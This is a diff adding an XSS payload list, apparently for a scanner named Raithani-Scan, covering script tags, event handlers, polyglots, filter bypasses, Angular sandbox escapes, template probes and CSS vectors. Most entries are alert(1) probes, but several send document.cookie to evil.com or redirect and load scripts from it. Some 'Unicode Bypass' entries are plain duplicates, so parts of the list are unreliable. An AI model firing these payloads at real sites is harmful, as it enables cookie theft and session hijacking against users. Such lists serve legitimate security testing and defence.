@@ -1,0 +1,184 @@
+# XSS Payloads - Raithani-Scan
+# ==============================
+# Basic Script
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>document.cookie</script>
+<script>fetch('https://evil.com/'+document.cookie)</script>
+<script>new Image().src='https://evil.com/'+document.cookie</script>
+<script>window.location='https://evil.com'</script>
+
+# Event Handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=document.location='https://evil.com'>
+<img src=1 onerror=alert(1)>
+<img src=1 href=1 onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=fetch('https://evil.com/'+btoa(document.cookie))>
+<image src=x onerror=alert(1)>
+<image src=x onerror=prompt(1)>
+<image src=1 onerror=alert(1)>
+<svg onload=alert(1)>
+<svg onload=prompt(1)>
+<svg onload=confirm(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(document.cookie)>
+<svg onload=alert(1)//
+<svg onload=alert(1)//
+<svg/onload=alert(1)//
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1) autofocus>
+<body onhashchange=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<audio onloadstart=alert(1)><source>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+
+# All on* events
+<div onmouseover=alert(1)>X
+<div onclick=alert(1)>X
+<div ondblclick=alert(1)>X
+<div onmousedown=alert(1)>X
+<div onmouseup=alert(1)>X
+<div onmouseenter=alert(1)>X
+<div onmouseleave=alert(1)>X
+<div onmousemove=alert(1)>X
+<div onwheel=alert(1)>X
+<div onscroll=alert(1)>X
+<div ondrag=alert(1)>X
+<div ondrop=alert(1)>X
+<div oncopy=alert(1)>X
+<div oncut=alert(1)>X
+<div onpaste=alert(1)>X
+<div onfocus=alert(1)>X
+<div onblur=alert(1)>X
+<div onresize=alert(1)>X
+<div onerror=alert(1)>X
+<div onload=alert(1)>X
+<div onplay=alert(1)>X
+<div onprogress=alert(1)>X
+
+# Polyglot XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+</script><script>alert(1)</script>
+</TITLE><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+<<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+
+# Unicode Bypass
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+
+# Attribute Based
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onfocus=alert(1) autofocus x="
+' onfocus=alert(1) autofocus x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><body onload=alert(1)>
+'><body onload=alert(1)>
+
+# Protocol Based
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:prompt(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:alert(1)
+javascript:/*--></title></script></textarea></style></noscript>alert(1)
+
+# Template/SSTI
+${alert(1)}
+${7*7}
+{{alert(1)}}
+{{7*7}}
+<%= alert(1) %>
+<%= 7*7 %>
+#{(alert(1))}
+*{alert(1)}
+{{constructor.constructor('alert(1)')()}}
+{{_construction.constructor.prototype}}
+
+# Mutation XSS
+<details x= id=x{{
+<details x= id=x onopen=alert(1)}}
+<details open ontoggle=alert(1)>
+<svg><style><script>alert(1)</script>
+<select><style><script>alert(1)</script>
+<math><style><script>alert(1)</script>
+<table><style><script>alert(1)</script>
+
+# DOM Based
+#<script>alert(1)</script>
+javascript:alert(1)#
+#<img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+
+# Angular Sandbox Bypass
+{{a=toString().constructor.prototype;a.charAt=a.trim;$on.construct=reduce.constructor;getClass=construct.constructor;$on.construct=construct.constructor;getClass.constructor('alert(1)')()}}
+{{(_=''.sub).call = $ = ''.sub;_.constructor.constructor('alert(1)')()}}
+{{a='constructor';b='alert(1)';c=a;d=b;eval.call(c,d)}}
+
+# Nesting Bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt src=http://evil.com></scr</script>ipt>
+<scri<script>pt>alert(1)</scri</script>pt>
+<svg><svg/onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload%20=alert(1)>
+<svg%20onload=alert(1)>
+
+# Short XSS
+<q/onload=alert(1)>
+<w/onload=alert(1)>
+<x/onload=alert(1)>
+<y/onload=alert(1)>
+<z/onload=alert(1)>
+<xss id=x onfocus=alert(1) tabindex=1>#x
+<body/id=x onfocus=alert(1) tabindex=1>#x
+<svg/id=x onfocus=alert(1) tabindex=1>#x
+<output/onfocus=alert(1) autofocus tabindex=1>
+
+# Condition Based
+<!--[if gte IE 4]><script>alert(1)</script><![endif]-->
+<!--[if IE]><script>alert(1)</script><![endif]-->
+<!--[if !IE]><!--><script>alert(1)</script><!--<![endif]-->
+
+# CSS Based
+<Link Rel=stylesheet Href=javascript:alert(1)>
+<STYLE>@import'javascript:alert(1)';</STYLE>
+<STYLE>BODY{-moz-binding:url("javascript:alert(1)")}</STYLE>
+<div style="background:url(javascript:alert(1))">
+<div style="background:expression(alert(1))">
